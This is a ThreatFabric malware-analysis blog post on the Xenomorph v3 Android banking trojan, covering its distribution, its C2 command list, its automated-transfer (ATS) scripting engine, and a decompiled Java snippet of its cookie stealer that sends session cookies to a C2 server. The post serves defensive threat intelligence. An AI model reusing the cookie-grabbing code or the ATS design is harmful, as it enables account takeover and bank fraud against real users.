    "plain_text": "# Xenomorph v3: a new variant with ATS targeting more than 400 institutions\n\n**threatfabric.com/blogs/xenomorph-v3-new-variant-with-ats.html**\n\nResearch\n\n10 March 2023\n\n\n-----\n\n## Xenomorph Introduces ATS and hundreds of new Targets\n\nIn the last year ThreatFabric saw a radical shift in the approach towards mobile malware from criminals. Criminals have\nstarted paying closer attention to the world of Mobile banking, abandoning more rudimental approaches in favor of a\nmore refined and professional philosophy.\n\nThe most evident example of this new wave of malware creators is offered by the Hadoken Security Group. We have\n[mentioned this actor previously in our blog about BugDrop: the products developed and distributed by this group have](https://www.threatfabric.com/blogs/bugdrop-new-dropper-bypassing-google-security-measures.html)\nbeen circulating for the entirety of 2022, while the actors themselves surfaced by claiming the ownership of the malware\nin May.\n\n[The main product of this group is Xenomorph, a Android banking trojan discovered by ThreatFabric in February 2022.](https://www.threatfabric.com/blogs/xenomorph-a-newly-hatched-banking-trojan.html)\nThis malware family has been a work in progress for the entirety of 2022, and despite being distributed in small\ncampaigns, it never truly reached the volume of other malware families on the threat landscape, such as Octo or more\nrecently Hook.\n\nXenomorph campaigns have always been characterized by short and contained distribution efforts, first via\nGymDrop, a dropper operation created and managed by the same group, and later via Zombinder, another distribution\nvector that we covered on a previous article in December 2022. In either case, the short bursts of activity were indicative\nof short test runs opposed to a real large scale distribution with fraudulent intent.\n\nHowever, things are very likely to change in the near future: ThreatFabric’s analysts have discovered a new variant of\nthis malware family, which we classify as Xenomorph.C.\n\nThis new version of the malware adds many new capabilities to an already feature rich Android Banker, most notably the\nintroduction of a very extensive runtime engine powered by Accessibility services, which is used by actors to\nimplement a complete ATS framework. With these new features, Xenomorph is now able to completely automate the\nwhole fraud chain, from infection to funds exfiltration, making it one of the most advanced and dangerous Android\nMalware trojans in circulation.\n\nIn addition, the samples identified by ThreatFabric featured configurations with Target lists made of more than 400\n**banking and financial institutions, including several cryptocurrency wallets, with an increase of more than 6 times**\nwith comparison to its previous variants, including financial institutions from all continents.\n\n\n-----\n\nIn addition, after discovering some samples belonging to this new variant, our researchers also discovered the website\ndedicated to the of this Android banker, indicating clear intentions of entering the MaaS landscape, and start large scale\ndistribution.\n\nThis functionality is typical of more advanced malware families, such as Gustuff and SharkBot, which have caused\nthousands of euros worth of damage towards their targeted institutions.\n\nIn this article we will cover the main new features of this variant, and how these new variations can elevate Xenomorph’s\nthreat level.\n\n## Distribution\n\n### Test Samples\n\nThreatFabric was able to identify also some samples connected to test campaigns: in these cases, the samples seem to\nbe linked with distribution abusing third party hosting services, more specifically Discord Content Delivery Network\n**(CDN). This is not the first time we see malware using this sort of legitimate hosting services: it not uncommon to see**\nmalware authors use services such as Discord CDN or GitHub repositories to hide in plain sight their products.\n\n\n-----\n\nThe reasons for using this sort of service are quite straight forward: these are very common services, which are very\n**reliable and used by millions of people. In addition, it is free to open an account and use it to distribute malware and**\nthere are no limitation on the number of accounts.\nFinally, it is very common for devices to connect to such services, so\nit is less likely that a security service might flag connections to these domains as suspicious.\n\nIn this specific case it is likely that these samples, which are not really part of any campaign, were simply hosted on\nDiscord CDN for sharing purposes, and not for distribution.\n\n### Zombinder Campaign\n\nThe first variants of Xenomorph were distributed by GymDrop, in February 2022. Later in the year we saw the Hadoken\ngroup switch distribution medium, trying out first BugDrop, and finally landing on Zombinder. In our case, Xenomorph\nv3 is deployed by a Zombinder app “bound” to a legitimate currency converter, which downloads as an “update” an\napplication posing as Google Protect:\n\n\n-----\n\nThis seems to be the method of choice with the third version of Xenomorph, abandoning previous in-house developed\ntechniques. Despite this, actors behind Zombinder have claimed to have stopped providing the service, indicating that\nthere might be once again a switch in distribution in future builds of Xenomorph.\n\n## Targets\n\nXenomorph, since its first appearance, has revolved around gathering PII such as usernames and passwords using\n**overlay attacks.**\n\nOver the course of 2022, Xenomorph has maintained a relatively stable set of targets in its configuration, with specific\ninterest in Spain, Portugal, and Italy, with the latest campaigns also introducing Belgian and Canadian institutions,\ntogether with some cryptocurrency wallets.\n\nThe first sample of this new variant analyzed by ThreatFabric continued this trend, featuring the same list of targets as\nthe previous versions observed. However, another sample, seemingly belonging to the same campaign, but sporting the\ntag “xeno3-test”, contained a much larger list of targets, counting more than 400 institutions, more than 6 times the\nnumber of targets available in the first sample.\n\nIn the case of Android Banking malware served as MaaS, it is relatively common that different campaigns of the same\nmalware variant will have different targets, based on the requirements of the actors managing it. In many cases, actors\nwho develop malware outsource the job of maintaining overlays up-to-date with the latest designs of all the different\nbanking application that they target. There are several actors who sell this sort of service in hacking forums.\n\n\n-----\n\nConsidering the “xeno3-test” tag, it is likely that the application belongs to a test build, which might feature the actual list\n**of possible targets from which renters can choose from. Both lists will be available in the Appendix section of this**\narticle.\n\n## Capabilities\n\nThe first variant of Xenomorph discovered in February 2022 lacked a large amount of features, such as accessibility\nlogging and remote actions to abuse Accessibility Services to perform fraud. It is clear that ThreatFabric detected these\nfirst samples while the malware was still undergoing a clear development phase.\n\nAfter a few months of inactivity since its initial discovery, a new variant of the malware was discovered by ThreatFabric\nresearchers in June 2022. It included a complete overhaul of the code base, increasing the modularity of the source\ncode in order to make the malware more flexible and easier to update. This was very likely a initial test phase of\nXenomorph, which introduced the support for remote actions thanks to the introduction of a Accessibility Services\npowered runtime engine, which could be used to simulate actions to impersonate the victim.\n\nWith Xenomorph.C, criminals also added the support for a complete ATS framework using this engine, which is referred\nto as RUM engine by the actors.\n\nHere is the list of all commands supported by Xenomorph V3, with the newly added ones in bold:\n\n**Command** **Description**\n\napp_list Send List of installed apps\n\ninj_enable Enable injections\n\ninj_disable Disable Injections\n\ninj_list Not Implemented\n\ninj_update Request update of injections\n\nfg_enable Enable notification in Foreground\n\n\n-----\n\n**Command** **Description**\n\nfg_disable Disable notification in Foreground\n\nnotif_ic_enable Enable Notification Intercept\n\nnotif_ic_disable Disable Notification Intercept\n\nnotif_ic_list Not Implemented\n\nnotif_ic_update Not Implemented\n\nsms_log Log SMSs\n\nsms_ic_enable Enable SMS Intercept\n\nsms_ic_disable Disable SMS Intercept\n\nsocks_start Start Socks server\n\nsocks_stop Stop Socks server\n\nsms_ic_list Not Implemented\n\nsms_ic_update Not Implemented\n\napp_kill Kill Specified Application Process\n\napp_delete Not Implemented\n\napp_clear_cache Not Implemented\n\nself_kill Not Implemented\n\nself_cleanup Removes the malware itself\n\n**app_start** Start Specified Application\n\n**show_push** Show Push notification\n\n**cookies_handler** Obtain Cookies\n\n**send_sms** Send SMS\n\n**make_ussd** Run USSD Code\n\n**call_forward** Forward Call\n\n**execute_rum** Run ATS Module\n\n### ATS Framework\n\nAs we covered in previous articles, the term ATS (Automated Transfer Systems) is used to define a set of features that\nallow criminals to automatically complete fraudulent transactions on infected devices. Such systems are able to\n**automatically extract credentials, account balance, initiate transactions, obtain MFA tokens and finalize the fund**\ntransfers, without the need of human interaction from an operator.\n\nScripts are received in JSON format, are processed, and converted into a list of operations to be executed by the engine\non the device. Here is an example of the structure of such scripts:\n\n\n-----\n\n```\n{\n  \"module\": \"<MODULE_NAME>\",\n\n  \"version\": 1,\n\n  \"parameters\": [...], // LIST OF PARAMETERS\n\n  \"requires\": [...], // LIST OF REQUIRED CONDITIONS\n\n  \"triggerConditions\": [...], // LIST OF TRIGGER CONDITIONS\n\n  \"terminator\": {...}, // IS TERMINATOR ENABLED\n\n  \"operations\": [...] // LIST OF OPERATIONS TO BE EXECUTED (ATS)\n\n}\n\n```\nWith the help of such systems, the malware present on an infected device can easily extract the required PIIs and use\n**them to perform all sorts of criminal activity.**\n\nThe engine used by Xenomorph stands out from its competition thanks to the extensive selection of possible actions that\nare programmable and can be included in ATS scripts, in addition to a system that allows for conditional execution and\n**action prioritization.\nTo illustrate the capabilities of this engine, we will take as an example a script extracted from**\nXenomorph’s config and used to extract MFA codes from Google’s authenticator application.\n\nBanks are slowly abandoning the use of SMS to perform Multi-Factor Authentication (MFA). As an alternative, many\ninstitutions seem to have opted for the use of Authenticators applications. However, such applications are often used\non the same device used to complete the transaction. A modern banking malware installed on an infected device is able\nto initiate a fraudulent transaction abusing the targeted banking application, and at the same time use the authenticator\napp to read the required authentication codes.\n\nIn the case of Xenomorph, criminals created a ATS module for exactly this purpose: the code collection module is\ntriggered whenever the authenticator app is launched by the malware, using quite flexible conditional trigger conditions,\nas shown in the image below:\n\nThe engine provides quite a large set of customizable options, including for example logical operators. This allows\ncriminals to create complex conditions to take care of all possible scenarios, increasing the effectiveness of each\ninfection.\n\nIf these conditions are satisfied, the malware will proceed and extract codes which follow a specific structure, which in\nthe case of authenticator codes consists in two groups made out of three digits, as shown in the following image:\n\n\n-----\n\nThis is just an example of ATS script. Here is the full list of available actions and their corresponding description:\n\n**Action Code** **Description**\n\nclickOnNode Clicks on specified node\n\ngetRootNode Get pointer to Root node\n\ngetParent Get Parent of Specified node\n\ngetFirstNeighborsRespectively Get nearest node\n\nfindAllowButton Finds button to allow action\n\ngetText Gets text of specified node\n\nclickOnParent Clicks on parent node\n\nclickOnFirstClickable Clicks on nearest clickable object\n\nclickAllowButton Clicks on allow button\n\nclickCancelButton Clicks on cancel button\n\nCONTROL_MODULE_FINISH_SUCCESSFULLY Communicate with control module a successful\nexecution\n\nCONTROL_MODULE_ABORT Communicate with control module a failed\nexecution\n\nCONTROL_GO_HOME Press HOME button\n\nCONTROL_GO_BACK Press BACK button twice\n\nCONTROL_GO_BACK5 Press BACK button 5 times\n\nCONTROL_MODULE_RETURN Communicate with control module a finished\nexecution\n\n\n-----\n\n**Action Code** **Description**\n\nDEBUG_LOG_CONTEXT Log current context\n\nDEBUG_LOG_WHOLE_CONTEXT Log entire context\n\nDEBUG_LOG_MODULE_REGISTERED_ACTIONS Log RUM registered actions\n\nDEBUG_LOG_CURRENT_DATA Log data contained in current context\n\nDEBUG_PRINT Debug print function\n\nsetActionPassedThrough Sets an existing action to be ignored by the\nengine\n\nfindNodesByParameters Finds nodes on UI based on search parameters\n\nfindFirstNodeByParameters Finds first node matching on UI based on search\nparameters\n\nfindNodesByClass Finds node based on class name\n\nfindFirstNodeByClass Finds first node based on class name\n\nfindNodesByViewId Finds node based on ViewId\n\nfindFirstNodeByViewId Finds first node based on ViewId\n\nfindFirstNodeByText Finds node based on text\n\ngetNodeByIndex Finds first node based on text\n\ngetFirstChildOfClass Finds node which is a child of specified class\n\nCONTROL_PUT_ACTION_RESULT Store a bool indicating if the action was\nsuccessful\n\nsleepForMilliseconds Sleep for specified number of milliseconds\n\nCONTROL_SET_UNPROCESSED Sets if there was an unprocessed event\n\nCONTROL_CLEAR_UNPROCESSED Clears unprocessed events\n\nCONTROL_FLUSH_ALL_CONTEXT_DATA_ENTRIES Clear all node entries\n\nSTATE_EVENT_CLEAR Clear state events\n\nCONTROL_RUN_MODULE_STRAIGHT Run ATS module\n\nCONTROL_GLOBAL_VALUE_SET_FROM_TEXT_DATA_ENTRY Set Value in Shared Preferences from data entry\n\nCONTROL_GLOBAL_VALUE_SET Set Value in Shared Preferences\n\nDATA_JOIN_TUPLE_LIST Join lists of variables into tuple list\n\nAPI_SEND_SIMPLE_STATE_WITH_OBJECT Send data to C2\n\nWith this array of features and capabilities, it is quite easy to create a script to extract information such as account\nbalance, and then perform all the necessary steps to complete a fraudulent transaction.\n\n### Cookie Stealer\n\nXenomorph’s latest version also added Cookie stealer capabilities to its already very extensive arsenal of weapons.\nAfter being introduced in the world of Android bankers by S.O.V.A. in September 2021, this feature was also added to\nthe list of features of other families such as SharkBot, and now Xenomorph.\n\n\n-----\n\nSession Cookies allow users to maintain open sessions on their browsers without having to re input their credentials\nrepeatedly. A malicious actor in possession on a valid session cookie has effectively access to the victim’s logged in web\nsession.\n\nXenomorph, just like the other malware families previously mentioned, starts a browser with JavaScript interface\n**enabled. The malware uses this browser to display the targeted page to the victim, with the intent of tricking users into**\nlogging into the service whose cookie Xenomorph is trying to extract.\n\nUpon successful login, the browser will extract the cookie using the Android CookieManager and will send it to the C2\nserver, giving an additional way to perform account takeover (ATO) to criminals. Here is a snippet of the code used to\ngrab the cookie from the malware controlled browser:\n\n\n-----\n\n```\n                  ( );\nthis.wv = webView0;\n\nwebView0.getSettings().setJavaScriptEnabled(true);\n\nthis.wv.setWebViewClient(new WebViewClient() {\n\n  @Override // android.webkit.WebViewClient\n\n  public void onPageFinished(WebView webView0, String s) {\n\n    String s1 = CookieManager.getInstance().getCookie(s);\n\n    String[] arr_s = CookieManager.getInstance().getCookie(s).replace(\";\", \"\").split(\" \");\n\n    if(s1.contains(\"sessionid\")) {\n\n      try {\n\n        JSONObject jSONObject0 = new JSONObject();\n\n        for(int v = 0; v < arr_s.length; ++v) {\n\n          String[] arr_s1 = arr_s[v].split(\"=\");\n\n          jSONObject0.put(arr_s1[0], arr_s1[1]);\n\n          new StringBuilder().append(\"cookie is = \").append(jSONObject0).toString();\n\n        }\n\n        UtilGlobal.sendCookies(jSONObject0.toString());\n\n      }\n\n      catch(Exception exception0) {\n\n        UtilGlobal.sendCookies(\"cookiesGrabbingFailed\");\n\n        new StringBuilder().append(\"Cookie Grabber Error:\n\").append(exception0.getMessage()).toString();\n\n      }\n\n      return;\n\n    }\n\n  }\n\n});\n\nthis.wv.addJavascriptInterface(new WebAppInterface(this), \"Android\");\n\nthis.wv.loadUrl(\"$rstr[CURD]\");\n\nthis.setContentView(this.wv);\n\n## Conclusions\n\n```\nThe Xenomorph saga highlights once more that actors are switching their focus on mobile malware. The efforts of\nHadoken Security Group showcase how criminals are adopting more structured development cycles and programming\nphilosophies to create increasingly more dangerous malware families.\nThe latest version of Xenomorph included large\nimprovements from its previous iteration, adding Automated Transfer System (ATS) capabilities, which elevate the\nthreat level of this family even more.\n\nXenomorph v3 is capable of performing the whole fraud chain, from infection, with the aid of Zombinder, to the\nautomated transfer using ATS, passing by PII exfiltration using Keylogging and Overlay attacks. In addition, the Threat\nActor behind this malware family has started actively publicizing their product, indicating a clear intention to expand\n**the reach of this malware. ThreatFabric expects Xenomorph to increase in volume, with the likelihood of being one**\nagain distributed via droppers on the Google Play Store.\n\nFinancial organizations are welcome to contact us: if you suspect some app be involved in malicious activity, feel free to\nreach our Mobile Threat Intelligence team which will provide additional details and help with reporting the malicious app if\n[identified: mti@threatfabric.com.](mailto://mti@threatfabric.com)\n\n## Fraud Risk Suite\n\nThreatFabric’s Fraud Risk Suite enables safe & frictionless online customer journeys by integrating industry-leading\nmobile threat intel, behavioral analytics, advanced device fingerprinting and over 10.000 adaptive fraud indicators.
